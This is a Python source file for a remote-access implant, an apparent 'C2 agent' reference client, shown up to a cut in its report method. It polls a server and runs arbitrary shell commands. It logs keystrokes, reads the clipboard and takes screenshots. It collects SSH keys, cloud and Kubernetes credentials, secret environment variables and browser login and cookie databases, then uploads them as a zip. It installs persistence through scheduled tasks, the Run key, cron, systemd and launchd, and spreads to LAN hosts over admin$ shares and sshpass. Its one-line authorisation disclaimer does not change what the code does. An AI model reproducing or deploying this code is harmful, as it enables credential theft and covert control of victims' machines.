#!/usr/bin/env python3
"""C2 agent — Python reference implementation.

This is the canonical client. The wire protocol is documented in
C2/protocol.md; ports exist for Go, C#, Rust, PowerShell and Bash.

Usage:
    pip install requests
    pip install pynput  # optional: enables keylog task
    python agent.py --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
    python agent.py --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
                    --interval 5 --jitter 2 --verbose

Only use against systems you own or are authorized to test.
"""
import argparse
import getpass
import json
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import zipfile
from collections import deque
from datetime import datetime, timezone

import requests

DEFAULT_STATE = os.path.join(os.path.expanduser("~"), ".c2agent.json")

SHELL_TIMEOUT = 120   # seconds
OUTPUT_LIMIT = 12000   # characters reported back
KEYLOG_DUMP_LIMIT = 8000  # max chars per keylog dump


def truncate_output(text: str, limit: int = OUTPUT_LIMIT) -> str:
    """Truncate output showing first 20% + last 80% to preserve both
    error messages (head) and results (tail)."""
    if len(text) <= limit:
        return text
    head_size = limit // 5
    tail_size = limit - head_size - 20  # 20 chars for the marker
    return text[:head_size] + f"\n... [{len(text) - head_size - tail_size} chars truncated] ...\n" + text[-tail_size:]


def local_ip() -> str:
    """Best-effort primary interface IP (UDP connect never sends packets)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return ""


class KeyLogger:
    """Cross-platform keystroke logger using pynput (optional dependency)."""

    def __init__(self):
        self._lock = threading.Lock()
        self._buffer: deque[str] = deque()
        self._listener = None
        self._active = False

    def _on_press(self, key):
        try:
            char = key.char
            if char:
                with self._lock:
                    self._buffer.append(char)
                    return
        except AttributeError:
            pass
        with self._lock:
            self._buffer.append(f"[{key.name}]" if hasattr(key, "name") else f"[{key}]")

    def start(self) -> str:
        if self._active:
            return "keylogger already running"
        try:
            from pynput.keyboard import Listener
            self._listener = Listener(on_press=self._on_press)
            self._listener.daemon = True
            self._listener.start()
            self._active = True
            return "keylogger started"
        except ImportError:
            return "error: pynput not installed (pip install pynput)"
        except Exception as exc:
            return f"error starting keylogger: {exc}"

    def stop(self) -> str:
        if not self._active:
            return "keylogger not running"
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._active = False
        return "keylogger stopped"

    def dump(self) -> str:
        with self._lock:
            if not self._buffer:
                return "(no keystrokes recorded)"
            text = "".join(self._buffer)
            if len(text) > KEYLOG_DUMP_LIMIT:
                text = f"...{text[-KEYLOG_DUMP_LIMIT:]}"
            return text

    def clear(self) -> None:
        with self._lock:
            self._buffer.clear()

    @property
    def active(self) -> bool:
        return self._active


class c2agent:
    def __init__(self, server: str, token: str, interval: int = 10,
                 jitter: float = 0.0, state_file: str = DEFAULT_STATE,
                 verbose: bool = False):
        self.server = server.rstrip("/")
        self.token = token
        self.interval = max(1, int(interval))
        self.jitter = max(0.0, float(jitter))
        self.state_file = state_file
        self.verbose = verbose
        self._sess = requests.Session()
        self.agent_id = self._load_id()
        self.keylog = KeyLogger()
        self._clones = {}  # target -> {thread, stop_event, info}

    # ------------------------------------------------------------ helpers
    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"[*] {msg}", flush=True)

    def _load_id(self) -> str | None:
        try:
            with open(self.state_file, "r", encoding="utf-8") as fh:
                return json.load(fh).get("agent_id")
        except Exception:
            return None

    def _save_id(self) -> None:
        with open(self.state_file, "w", encoding="utf-8") as fh:
            json.dump({"agent_id": self.agent_id}, fh)

    def _headers(self) -> dict:
        return {"X-Agent-Token": self.token}

    def _json_headers(self) -> dict:
        return {**self._headers(), "Content-Type": "application/json"}

    def _os_name(self) -> str:
        if sys.platform.startswith("win"):
            return "windows"
        if sys.platform == "darwin":
            return "darwin"
        return "linux"

    # ---------------------------------------------------------- lifecycle
    def register(self) -> None:
        body = {
            "agent_id": self.agent_id,
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "os": self._os_name(),
            "arch": os.environ.get("PROCESSOR_ARCHITECTURE", "")
                    if sys.platform == "win32"
                    else (os.uname().machine if hasattr(os, "uname") else ""),
            "pid": os.getpid(),
            "ip": local_ip(),
            "version": "1.0",
            "type": "Python",
        }
        self._log(f"registering with {self.server}")
        r = self._sess.post(f"{self.server}/api/register", json=body,
                            headers=self._json_headers(), timeout=15)
        r.raise_for_status()
        self.agent_id = r.json()["agent_id"]
        self._save_id()
        self._log(f"agent id: {self.agent_id}")

    def checkin(self) -> list:
        r = self._sess.post(f"{self.server}/api/checkin",
                            json={"agent_id": self.agent_id},
                            headers=self._json_headers(), timeout=15)
        if r.status_code == 404:
            self._log("server does not know us — re-registering")
            self.register()
            return []
        r.raise_for_status()
        return r.json().get("tasks", [])

    # ------------------------------------------------------------- tasks
    def execute(self, task: dict) -> dict:
        task_id, ttype = task["task_id"], task["type"]
        args = task.get("args") or {}
        self._log(f"running task {task_id} ({ttype})")
        if ttype == "shell":
            timeout = SHELL_TIMEOUT
            try:
                timeout = max(1, min(int(args.get("timeout", SHELL_TIMEOUT)), 3600))
            except (TypeError, ValueError):
                pass
            return self._cmd(args.get("command", ""), timeout)
        if ttype == "download":
            return self._download(task_id, args)
        if ttype == "upload":
            return self._upload(task_id, args)
        if ttype == "sleep":
            try:
                self.interval = max(1, int(args.get("seconds", 10)))
            except (TypeError, ValueError):
                pass
            return {"output": f"heartbeat interval set to {self.interval}s",
                    "exit_code": 0}
        if ttype == "keylog":
            return self._keylog(args)
        if ttype == "clipboard":
            return self._clipboard(args)
        if ttype == "screenshot":
            return self._screenshot(task_id, args)
        if ttype == "steal":
            return self._steal(task_id, args)
        if ttype == "clone":
            return self._clone(args)
        if ttype == "persistence":
            return self._persistence(args)
        if ttype == "lateral":
            return self._lateral(args)
        if ttype == "exit":
            return {"output": "exiting", "exit_code": 0, "_exit": True}
        return {"output": f"unknown task type: {ttype}", "exit_code": 1}

    # ------------------------------------------------- persistence / lateral
    @staticmethod
    def _quote(s: str) -> str:
        return "'" + s.replace("'", "'\\''") + "'"

    def _relaunch_cmd(self, script: str | None = None) -> str:
        """Re-invocation command that preserves server/token/interval/jitter."""
        py = os.path.abspath(sys.executable) or sys.executable
        script = script or os.path.abspath(sys.argv[0])
        return (f'"{py}" "{script}" --server {self.server} '
                f'--token {self.token} --interval {self.interval} '
                f'--jitter {self.jitter}')

    def _persistence(self, args: dict) -> dict:
        if not args or not args.get("method"):
            args = {} if not args else dict(args)
        try:
            if sys.platform == "win32":
                return self._persist_win()
            if sys.platform == "darwin":
                return self._persist_darwin()
            return self._persist_linux()
        except Exception as exc:  # noqa: BLE001
            return {"output": f"persistence error: {exc}", "exit_code": 1}

    def _persist_win(self) -> dict:
        base = os.environ.get("APPDATA") or os.path.expanduser("~")
        drop = os.path.join(base, "Microsoft", "Windows", "c2update")
        os.makedirs(drop, exist_ok=True)
        name = "c2agent" + (os.path.splitext(sys.argv[0])[1] or ".py")
        dest = os.path.join(drop, name)
        try:
            shutil.copyfile(sys.argv[0], dest)
        except OSError as exc:
            return {"output": f"persistence error: could not copy self: {exc}",
                    "exit_code": 1}
        relaunch = self._relaunch_cmd(dest)
        lines = [f"persistence: copied self to {dest}"]
        # The launcher lives in a space-free directory so schtasks /TR and the
        # Run key can reference it without fragile nested-quote escaping.
        progdata = os.environ.get("ProgramData") or os.environ.get(
            "ALLUSERSPROFILE", r"C:\ProgramData")
        launcher_dir = os.path.join(progdata, "c2update")
        try:
            os.makedirs(launcher_dir, exist_ok=True)
            wrapper = os.path.join(launcher_dir, "c2relaunch.cmd")
            with open(wrapper, "w", encoding="utf-8") as fh:
                fh.write("@echo off\r\nstart \"\" /b " + relaunch + "\r\n")
        except OSError as exc:
            return {"output": f"persistence error: could not write launcher: {exc}",
                    "exit_code": 1}
        lines.append(f"persistence: wrote launcher {wrapper}")
        r = self._cmd(
            f'schtasks /Create /TN "c2agent-persist" /TR "{wrapper}" '
            f'/SC ONLOGON /RL HIGHEST /F 2>&1', 30)
        lines.append(r["output"].strip())
        try:
            reg = subprocess.run(
                ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                 "/v", "c2agent", "/t", "REG_SZ", "/d", wrapper, "/f"],
                capture_output=True, text=True, timeout=30)
            r2out = (reg.stdout or "") + (reg.stderr or "")
            r2code = reg.returncode
        except Exception as exc:  # noqa: BLE001
            r2out = f"error: {exc}"
            r2code = 1
        lines.append("reg: " + r2out.strip())
        code = 0 if (r["exit_code"] == 0 or r2code == 0) else 1
        return {"output": truncate_output("\n".join(lines)), "exit_code": code}

    def _persist_unix(self, launchd: bool = False) -> dict:
        cfg = os.path.join(os.path.expanduser("~"), ".config", "c2update")
        os.makedirs(cfg, exist_ok=True)
        src = os.path.abspath(sys.argv[0])
        dest = os.path.join(cfg, os.path.basename(src))
        try:
            shutil.copyfile(src, dest)
        except OSError as exc:
            return {"output": f"persistence error: could not copy self: {exc}",
                    "exit_code": 1}
        relaunch = self._relaunch_cmd(dest)
        lines = [f"persistence: copied self to {dest}"]
        if launchd:
            plist = os.path.join(cfg, "com.c2.update.plist")
            with open(plist, "w", encoding="utf-8") as fh:
                fh.write(
                    '<?xml version="1.0" encoding="UTF-8"?>\n'
                    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                    '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                    '<plist version="1.0"><dict>\n'
                    '<key>Label</key><string>com.c2.update</string>\n'
                    '<key>ProgramArguments</key><array>\n'
                    '<string>/bin/sh</string><string>-c</string>'
                    f'<string>{relaunch}</string>\n</array>\n'
                    '<key>RunAtLoad</key><true/>\n'
                    '<key>StartInterval</key><integer>120</integer>\n'
                    '</dict></plist>\n')
            r = self._cmd(f'launchctl load -w "{plist}" 2>&1', 30)
            lines.append(r["output"].strip())
            return {"output": truncate_output("\n".join(lines)),
                    "exit_code": r["exit_code"]}
        cron = "@reboot " + relaunch + " # c2agent-persist"
        r = self._cmd(
            "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; "
            "echo " + self._quote(cron) + ") | crontab - 2>&1", 30)
        lines.append(r["output"].strip())
        unit = os.path.join(cfg, "c2-update.service")
        with open(unit, "w", encoding="utf-8") as fh:
            fh.write(
                "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\n"
                "ExecStart=/bin/sh -c " + self._quote(relaunch) + "\n"
                "Restart=always\n\n[Install]\nWantedBy=default.target\n")
        r2 = self._cmd(
            'systemctl --user daemon-reload 2>&1; '
            f'systemctl --user enable --now {self._quote(unit)} 2>&1', 30)
        lines.append(r2["output"].strip())
        code = 0 if (r["exit_code"] == 0 or r2["exit_code"] == 0) else 1
        return {"output": truncate_output("\n".join(lines)), "exit_code": code}

    def _persist_linux(self) -> dict:
        return self._persist_unix(launchd=False)

    def _persist_darwin(self) -> dict:
        return self._persist_unix(launchd=True)

    def _lan_peers(self, subnet: str = "") -> list:
        peers = set()
        me = local_ip()
        if subnet:
            base = subnet.rsplit(".", 1)[0]
        elif me.count(".") == 3:
            base = me.rsplit(".", 1)[0]
        else:
            return []
        for cmd in (["arp", "-a"], ["ip", "neigh"]):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=10)
            except Exception:  # noqa: BLE001
                continue
            for tok in re.findall(r"\b\d+\.\d+\.\d+\.\d+\b", r.stdout or ""):
                if tok.startswith(base + ".") and tok != me:
                    peers.add(tok)
        if not peers:
            for i in range(1, 21):
                cand = f"{base}.{i}"
                if cand == me:
                    continue
                try:
                    with socket.create_connection((cand, 445), timeout=0.3):
                        peers.add(cand)
                except OSError:
                    pass
        return sorted(peers)[:30]

    def _deploy_win(self, host: str, user: str, pwd: str) -> str:
        share = rf"\\{host}\admin$"
        r = self._cmd(f'net use "{share}" /user:{user} "{pwd}" 2>&1', 20)
        if r["exit_code"] != 0:
            tail = r["output"].strip().replace("\n", "; ") or "access denied"
            return f"failed (net use: {tail})"
        remote = share + "\\" + os.path.basename(sys.argv[0])
        r = self._cmd(
            f'copy /y "{os.path.abspath(sys.argv[0])}" "{remote}" 2>&1', 60)
        if r["exit_code"] != 0:
            tail = r["output"].strip().replace("\n", "; ")
            self._cmd(f'net use "{share}" /delete /y 2>&1', 20)
            return f"failed (copy: {tail})"
        r = self._cmd(
            f'schtasks /Create /S {host} /TN "c2agent-lateral" '
            f'/TR "{remote}" /SC ONLOGON /RU {user} /RP {pwd} '
            f'/RL HIGHEST /F 2>&1', 30)
        self._cmd(f'net use "{share}" /delete /y 2>&1', 20)
        if r["exit_code"] != 0:
            tail = r["output"].strip().replace("\n", "; ")
            return f"deployed (file dropped; task: {tail})"
        return "deployed (file dropped + scheduled c2agent-lateral)"

    def _deploy_unix(self, host: str, user: str, pwd: str) -> str:
        if not shutil.which("sshpass"):
            return "skipped (sshpass not installed)"
        src = os.path.abspath(sys.argv[0])
        remote = "/tmp/" + os.path.basename(src)
        r = self._cmd(
            f'sshpass -p {self._quote(pwd)} scp -o StrictHostKeyChecking=no '
            f'-o ConnectTimeout=8 {self._quote(src)} {user}@{host}:{remote} '
            f'2>&1', 60)
        if r["exit_code"] != 0:
            tail = r["output"].strip().replace("\n", "; ")
            return f"failed (scp: {tail})"
        relaunch = (f'python3 "{remote}" --server {self.server} '
                    f'--token {self.token} --interval {self.interval} '
                    f'--jitter {self.jitter}')
        r = self._cmd(
            (f'sshpass -p {self._quote(pwd)} ssh -o StrictHostKeyChecking=no '
             f'-o ConnectTimeout=8 {user}@{host} '
             f'{self._quote("nohup " + relaunch + " >/dev/null 2>&1 &")} 2>&1'),
            30)
        if r["exit_code"] != 0:
            tail = r["output"].strip().replace("\n", "; ")
            return f"deployed (file uploaded; launch: {tail})"
        return "deployed (file uploaded + launched)"

    def _lateral(self, args: dict) -> dict:
        subnet = str(args.get("subnet") or "").strip()
        user = str(args.get("user") or os.environ.get("C2_LAT_USER",
                                                      "")).strip()
        pwd = str(args.get("pass") or os.environ.get("C2_LAT_PASS",
                                                     "")).strip()
        peers = self._lan_peers(subnet)
        if not peers:
            return {"output": "lateral: no LAN peers found", "exit_code": 1}
        lines = [f"lateral: {len(peers)} peer(s): {', '.join(peers)}"]
        deployed = failed = skipped = 0
        for host in peers:
            if not user or not pwd:
                status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
            elif sys.platform == "win32":
                status = self._deploy_win(host, user, pwd)
            else:
                status = self._deploy_unix(host, user, pwd)
            lines.append(f"  {host}: {status}")
            if status.startswith("deployed"):
                deployed += 1
            elif status.startswith("skipped"):
                skipped += 1
            else:
                failed += 1
        lines.append(f"lateral: deployed={deployed} failed={failed} "
                     f"skipped={skipped}")
        return {"output": truncate_output("\n".join(lines)), "exit_code": 0}

    def _cmd(self, command: str, timeout: int = SHELL_TIMEOUT) -> dict:
        self._log(f"executing: {command}")
        try:
            proc = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=timeout,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            return {"output": truncate_output(out), "exit_code": proc.returncode}
        except subprocess.TimeoutExpired:
            return {"output": f"command timed out ({timeout}s)",
                    "exit_code": 124}
        except Exception as exc:  # noqa: BLE001
            return {"output": f"error: {exc}", "exit_code": 1}

    def _download(self, task_id: str, args: dict) -> dict:
        fname = args.get("file") or "payload.bin"
        dest = args.get("destination") or fname
        self._log(f"downloading {fname} to {dest}")
        r = self._sess.get(f"{self.server}/api/files/{task_id}",
                         headers=self._headers(), stream=True, timeout=120)
        r.raise_for_status()
        if os.path.isdir(dest):
            dest = os.path.join(dest, fname)
        parent = os.path.dirname(os.path.abspath(dest))
        os.makedirs(parent, exist_ok=True)
        with open(dest, "wb") as fh:
            for chunk in r.iter_content(chunk_size=65536):
                fh.write(chunk)
        size = os.path.getsize(dest)
        return {"output": f"saved {size} bytes to {dest}", "exit_code": 0}

    def _upload(self, task_id: str, args: dict) -> dict:
        path = args.get("path") or ""
        if not os.path.isfile(path):
            return {"output": f"file not found: {path}", "exit_code": 1}
        self._log(f"uploading {path}")
        with open(path, "rb") as fh:
            r = self._sess.post(
                f"{self.server}/api/files/{task_id}",
                headers=self._headers(),
                files={"file": (os.path.basename(path), fh)},
                timeout=300,
            )
        r.raise_for_status()
        return {"output": f"uploaded {path}", "exit_code": 0}

    def _keylog(self, args: dict) -> dict:
        action = args.get("action", "dump").lower()
        if action == "start":
            output = self.keylog.start()
        elif action == "stop":
            output = self.keylog.stop()
        else:  # dump
            output = self.keylog.dump()
        return {"output": output, "exit_code": 0}

    def _clipboard(self, args: dict) -> dict:
        action = args.get("action", "get").lower()
        if action == "set":
            text = args.get("text", "")
            return self._clipboard_set(text)
        return self._clipboard_get()

    def _clipboard_get(self) -> dict:
        try:
            if sys.platform == "win32":
                proc = subprocess.run(
                    ["powershell", "-command", "Get-Clipboard"],
                    capture_output=True, text=True, timeout=10,
                )
                return {"output": proc.stdout.strip(), "exit_code": proc.returncode}
            else:
                try:
                    import tkinter as tk
                    root = tk.Tk()
                    root.withdraw()
                    text = root.clipboard_get()
                    root.destroy()
                    return {"output": text, "exit_code": 0}
                except Exception:
                    # fallback: try xclip/pbpaste
                    for cmd in [["xclip", "-selection", "clipboard", "-o"],
                                ["pbpaste"]]:
                        try:
                            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                            if proc.returncode == 0:
                                return {"output": proc.stdout, "exit_code": 0}
                        except FileNotFoundError:
                            continue
                    return {"output": "error: no clipboard tool available", "exit_code": 1}
        except Exception as exc:
            return {"output": f"error: {exc}", "exit_code": 1}

    def _clipboard_set(self, text: str) -> dict:
        try:
            if sys.platform == "win32":
                proc = subprocess.run(
                    ["powershell", "-command", f"Set-Clipboard -Value '{text.replace(chr(39), chr(39)+chr(39))}'"],
                    capture_output=True, text=True, timeout=10,
                )
                return {"output": "clipboard set", "exit_code": proc.returncode}
            else:
                for cmd in [["xclip", "-selection", "clipboard"],
                            ["pbcopy"]]:
                    try:
                        proc = subprocess.run(cmd, input=text, capture_output=True, text=True, timeout=5)
                        if proc.returncode == 0:
                            return {"output": "clipboard set", "exit_code": 0}
                    except FileNotFoundError:
                        continue
                return {"output": "error: no clipboard tool available", "exit_code": 1}
        except Exception as exc:
            return {"output": f"error: {exc}", "exit_code": 1}

    def _screenshot(self, task_id: str, args: dict) -> dict:
        try:
            fd, tmp = tempfile.mkstemp(suffix=".png")
            os.close(fd)
            name = (args.get("name") or "screenshot").strip() or "screenshot"
            if sys.platform == "win32":
                r = subprocess.run(
                    ["powershell", "-command",
                     "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
                     "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                     "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);"
                     "$g=[System.Drawing.Graphics]::FromImage($bmp);"
                     f"$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);"
                     f"$bmp.Save('{tmp}');"],
                    capture_output=True, text=True, timeout=30,
                )
            elif sys.platform == "darwin":
                r = subprocess.run(["screencapture", "-x", tmp],
                                   capture_output=True, text=True, timeout=30)
            else:
                r = None
                for tool in ([["import", "-window", "root", tmp], ["scrot", tmp],
                              ["gnome-screenshot", "-f", tmp]]):
                    try:
                        if shutil.which(tool[0]):
                            r = subprocess.run(tool, capture_output=True, text=True, timeout=30)
                            if r.returncode == 0:
                                break
                    except (FileNotFoundError, subprocess.TimeoutExpired):
                        continue
                if r is None or r.returncode != 0:
                    return {"output": "error: no screenshot tool available (try import/scrot/gnome-screenshot)", "exit_code": 1}
            if not os.path.isfile(tmp) or os.path.getsize(tmp) == 0:
                os.unlink(tmp)
                return {"output": "error: screenshot failed", "exit_code": 1}
            with open(tmp, "rb") as fh:
                fu = self._sess.post(
                    f"{self.server}/api/files/{task_id}",
                    headers=self._headers(),
                    files={"file": (f"{name}.png", fh, "image/png")},
                    timeout=120,
                )
            err = fu.status_code
            os.unlink(tmp)
            if err != 200:
                return {"output": f"screenshot upload failed: HTTP {err}", "exit_code": 1}
            return {"output": f"screenshot saved ({name}.png)", "exit_code": 0}
        except Exception as exc:
            return {"output": f"error: {exc}", "exit_code": 1}

    # ------------------------------------------------------------------
    # steal — collect credentials-ish material from the local machine.
    # Phase-1 scope: env vars, token files, and raw browser DB copies.
    # Results are zipped and uploaded via /api/files/{task_id}, then the
    # agent reports a listing (manifest) plus the uploaded archive name.
    # No decryption/decoding happens on the agent side.
    # ------------------------------------------------------------------
    STEAL_KEYWORDS = (
        "token", "secret", "password", "passwd", "key=", "api", "auth",
        "aws", "azure", "google", "github", "gitlab", "slack", "discord",
        "cookie", "session", "credential", "access", "proxy", "login",
    )
    STEAL_TOKEN_FILES = [
        ".aws/credentials", ".aws/config",
        ".git-credentials", ".netrc", ".npmrc", ".pypirc",
        ".pip/pip.conf", ".config/pip/pip.conf",
        ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
        ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
        ".docker/config.json", ".kube/config",
        ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
        ".ssh/known_hosts", ".ssh/authorized_keys",
    ]
    STEAL_MAX_FILE = 8 * 1024 * 1024  # per-file copy cap (8 MB)

    CHROMIUM_PROFILE_FILES = ("Login Data", "Cookies", "Web Data")
    FIREFOX_PROFILE_FILES = ("cookies.sqlite", "logins.json", "key4.db", "cert9.db")

    def _steal_safe_copy(self, src: str, dst_dir: str) -> bool:
        """Best-effort copy of one file into dst_dir, honoring size cap."""
        try:
            if not os.path.isfile(src):
                return False
            if os.path.getsize(src) > self.STEAL_MAX_FILE:
                return False
            os.makedirs(dst_dir, exist_ok=True)
            shutil.copy2(src, os.path.join(dst_dir, os.path.basename(src)))
            return True
        except OSError:
            return False

    def _steal_env(self, work: str) -> list:
        """Dump env vars whose KEY matches sensitive keywords into env.txt."""
        lines = []
        for k, v in os.environ.items():
            low = k.lower()
            if any(w in low for w in self.STEAL_KEYWORDS):
                lines.append(f"{k}={v}")
        if not lines:
            return []
        path = os.path.join(work, "env.txt")
        with open(path, "w", encoding="utf-8", errors="replace") as fh:
            fh.write("\n".join(sorted(lines)) + "\n")
        return ["env.txt"]

    def _steal_tokens(self, work: str) -> list:
        """Copy common credential/token files under ~ into tokens/."""
        home = os.path.expanduser("~")
        hits = []
        for rel in self.STEAL_TOKEN_FILES:
            src = os.path.join(home, rel)
            if self._steal_safe_copy(src, os.path.join(work, "tokens")):
                hits.append(f"tokens/{os.path.basename(rel)}")
        return hits

    def _browser_roots(self) -> dict:
        """Return {root_dir: 'chromium'|'firefox'} candidates per platform."""
        roots = {}
        home = os.path.expanduser("~")
        if sys.platform == "win32":
            la = os.environ.get("LOCALAPPDATA", "")
            appd = os.environ.get("APPDATA", "")
            chromiums = [
                "Google/Chrome/User Data",
                "Microsoft/Edge/User Data",
                "BraveSoftware/Brave-Browser/User Data",
                "Opera Software/Opera Stable",
            ]
            for rel in chromiums:
                if la:
                    roots[os.path.join(la, rel)] = "chromium"
            if appd:
                roots[os.path.join(appd, "Mozilla/Firefox/Profiles")] = "firefox"
        elif sys.platform == "darwin":
            base = os.path.join(home, "Library/Application Support")
            for name in ("Google/Chrome", "Microsoft Edge",
                         "BraveSoftware/Brave-Browser"):
                roots[os.path.join(base, name)] = "chromium"
            roots[os.path.join(base, "Firefox/Profiles")] = "firefox"
        else:
            for rel_variants in (("google-chrome", "chromium"),
                                 ("microsoft-edge", "msedge"),
                                 ("brave-browser", "brave"),
                                 ("opera", "opera")):
                for rel in rel_variants:
                    if rel:
                        roots[os.path.join(home, ".config", rel)] = "chromium"
            roots[os.path.join(home, ".mozilla/firefox")] = "firefox"
        return roots

    def _steal_browser(self, work: str) -> list:
        """Copy raw browser credential/cookie SQLite DBs into browser/."""
        hits = []
        for root, kind in self._browser_roots().items():
            if not os.path.isdir(root):
                continue
            targets = (self.FIREFOX_PROFILE_FILES if kind == "firefox"
                       else self.CHROMIUM_PROFILE_FILES)
            for dirpath, _dirs, files in os.walk(root):
                for fn in targets:
                    if fn in files and os.path.isfile(os.path.join(dirpath, fn)):
                        rel = os.path.relpath(dirpath, root)
                        dst = os.path.join(work, "browser", kind,
                                           rel.replace(os.sep, "__"))
                        if self._steal_safe_copy(os.path.join(dirpath, fn), dst):
                            hits.append(
                                f"browser/{kind}/{rel.replace(os.sep, '__')}/{fn}")
        return hits

    def _steal(self, task_id: str, args: dict) -> dict:
        profile = str(args.get("profile") or "all").strip().lower()
        if profile not in ("all", "env", "tokens", "browser"):
            profile = "all"
        work = tempfile.mkdtemp(prefix="c2steal_")
        manifest = []
        try:
            if profile in ("all", "env"):
                self._log("steal: collecting env vars")
                manifest.extend(self._steal_env(work))
            if profile in ("all", "tokens"):
                self._log("steal: collecting token files")
                manifest.extend(self._steal_tokens(work))
            if profile in ("all", "browser"):
                self._log("steal: collecting browser dbs")
                manifest.extend(self._steal_browser(work))
            if not manifest:
                shutil.rmtree(work, ignore_errors=True)
                return {"output": f"steal ({profile}): nothing found",
                        "exit_code": 1}
            # sanity: drop a manifest too
            with open(os.path.join(work, "manifest.txt"), "w",
                      encoding="utf-8") as fh:
                fh.write("\n".join(sorted(manifest)) + "\n")
            # zip everything except the archive itself
            archive = os.path.join(work, "steal.zip")
            with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
                for dirpath, _dirs, files in os.walk(work):
                    for fn in files:
                        if fn == "steal.zip":
                            continue
                        full = os.path.join(dirpath, fn)
                        zf.write(full, os.path.relpath(full, work))
            size = os.path.getsize(archive)
            with open(archive, "rb") as fh:
                r = self._sess.post(
                    f"{self.server}/api/files/{task_id}",
                    headers=self._headers(),
                    files={"file": ("steal.zip", fh, "application/zip")},
                    timeout=300,
                )
            if r.status_code != 200:
                return {"output": f"steal upload failed: HTTP {r.status_code}",
                        "exit_code": 1}
            listing = "\n".join(manifest)
            return {
                "output": truncate_output(
                    f"stole {len(manifest)} item(s) -> steal.zip ({size} bytes)\n"
                    f"{listing}", 4000),
                "exit_code": 0,
            }
        except Exception as exc:  # noqa: BLE001
            return {"output": f"error: {exc}", "exit_code": 1}
        finally:
            shutil.rmtree(work, ignore_errors=True)

    # ------------------------------------------------------------------
    # clone — cross-agent resurrection watchdog. An agent that runs this
    # task monitors a *target* agent (same or different host) via the
    # server. If the target is dead/stale, the watcher runs a relaunch
    # command to bring it back. Works best pairing two agents that res-
    # pawn each other when the companion (or itself) dies.
    # actions: start (monitor + resurrect) | stop | status
    # ------------------------------------------------------------------
    def _clone(self, args: dict) -> dict:
        action = str(args.get("action") or "start").strip().lower()
        target = str(args.get("target") or "").strip() or self.agent_id
        command = str(args.get("command") or "").strip()
        interval = 30
        try:
            interval = max(5, min(int(args.get("interval") or 30), 3600))
        except (TypeError, ValueError):
            pass

        if action == "stop":
            entry = self._clones.get(target)
            if not entry:
                return {"output": f"clone: no watcher for {target}",
                        "exit_code": 1}
            entry["stop_event"].set()
            entry["thread"].join(timeout=interval + 5)
            del self._clones[target]
            return {"output": f"clone: watcher for {target} stopped",
                    "exit_code": 0}

        if action == "status":
            if not self._clones:
                return {"output": "clone: no watchers running", "exit_code": 0}
            lines = []
            for tid, entry in self._clones.items():
                info = entry["info"]
                lines.append(
                    f"  {tid}: {info.get('status','?')} | "
                    f"last_check {info.get('last_check','?')} | "
                    f"relaunched {info.get('relaunches',0)}x | "
                    f"cmd: {info.get('command') or '(none)'}")
            return {"output": "clone watchers:\n" + "\n".join(sorted(lines)),
                    "exit_code": 0}

        # start
        if target in self._clones:
            return {"output": f"clone: watcher for {target} already running",
                    "exit_code": 1}
        if not command:
            return {"output": "clone: 'command' (relaunch cmd) required",
                    "exit_code": 1}
        stop_event = threading.Event()
        info = {"status": "starting", "last_check": "never",
                "relaunches": 0, "command": command}
        entry = {"thread": None, "stop_event": stop_event, "info": info}
        thread = threading.Thread(target=self._clone_loop,
                                  args=(target, command, interval,
                                        stop_event, info), daemon=True)
        entry["thread"] = thread
        self._clones[target] = entry
        thread.start()
        return {"output":
                f"clone: watcher started on target {target} "
                f"(every {interval}s, restart cmd: {command})",
                "exit_code": 0}

    def _clone_loop(self, target: str, command: str, interval: int,
                    stop_event: threading.Event, info: dict) -> None:
        while not stop_event.is_set():
            try:
                r = self._sess.get(
                    f"{self.server}/api/clone/status/{target}",
                    headers=self._headers(), timeout=15)
                if r.status_code == 404:
                    info.update(status="unknown", last_check="target gone")
                elif r.status_code == 200:
                    st = r.json().get("status", "unknown")
                    info["status"] = st
                    info["last_check"] = self._now_str()
                    if st in ("dead", "stale") and command:
                        # avoid hammering the restart command
                        if stop_event.is_set():
                            break
                        info["relaunches"] = info.get("relaunches", 0) + 1
                        self._log(
                            f"clone: target {target} {st} -> relaunching")
                        try:
                            subprocess.Popen(
                                command, shell=True,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                stdin=subprocess.DEVNULL,
                                start_new_session=True)
                        except Exception as exc:  # noqa: BLE001
                            self._log(f"clone: relaunch failed: {exc}")
                else:
                    info["status"] = f"http {r.status_code}"
                    info["last_check"] = self._now_str()
            except Exception as exc:  # noqa: BLE001
                info["status"] = "error"
                info["last_check"] = self._now_str()
                self._log(f"clone: status check failed: {exc}")
            stop_event.wait(interval)

    @staticmethod
    def _now_str() -> str:
        return datetime.now(timezone.utc).replace(tzinfo=None).strftime(
            "%Y-%m-%d %H:%M:%S")

    def report(self, task_id: str, result: dict) -> None:
        body = {
            "agent_id": self.agent_id,
            "task_id": task_id,
            "output": result.get("output", ""),
            "exit_code": result.get("exit_code", 0),
            "error": result.get("error", ""),
        }
        try:
